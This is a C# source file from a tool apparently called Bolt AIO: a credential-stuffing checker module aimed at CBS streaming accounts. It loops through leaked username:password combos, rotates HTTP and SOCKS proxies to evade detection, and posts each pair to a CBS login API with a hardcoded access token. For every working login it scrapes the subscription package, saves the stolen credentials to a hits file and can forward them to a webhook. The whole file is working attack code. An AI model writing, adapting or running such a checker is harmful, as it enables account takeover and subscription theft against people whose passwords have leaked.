using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class CBSmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = true;
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            var str = "_remember_me=NO&j_password=" + array[1] + "&j_username=" + array[0] +
                                      "&locale=en-US";
                            var strResponse = req
                                .Post(
                                    "https://www.cbs.com/apps-api/v2.0/iphone/auth/login.json?at=ABA5MzQ4MjEwNTE3ODQwMzU4XOOw7eWFZmOmb7ZHnqXocg2UTDahpBnxY5dyeSHgiWDwXXh9XsWhT/yFwEausu4o",
                                    str, "application/x-www-form-urlencoded").ToString();
                            {
                                if (strResponse.Contains("Invalid username/password pair\",\"success"))
                                {
                                    Program.TotalChecks++;
                                    Program.Fails++;
                                }
                                else if (strResponse.Contains("userId")) //hit
                                {
                                    var cap = req
                                        .Get(
                                            "https://www.cbs.com/apps-api/v3.0/iphone/login/status.json?at=ABA5MzQ4MjEwNTE3ODQwMzU4XOOw7eWFZmOmb7ZHnqXocg2UTDahpBnxY5dyeSHgiWDwXXh9XsWhT/yFwEausu4o&locale=en-US")
                                        .ToString();
                                    var sub = Regex.Match(cap, "packageCode\":(.*?),").Groups[1].Value;
                                    Program.Hits++;
                                    Program.TotalChecks++;
                                    Export.AsResult("/Cbs_hits", array[0] + ":" + array[1] + " | Sub: " + sub);
                                    if (Program.lorc == "LOG")
                                        Settings.PrintHit("CBS", array[0] + ":" + array[1] + " | Sub: " + sub);
                                    if (Settings.sendToWebhook)
                                        Settings.sendTowebhook1(array[0] + ":" + array[1], "Cbs Hits");
                                }
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                            req.Dispose();
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}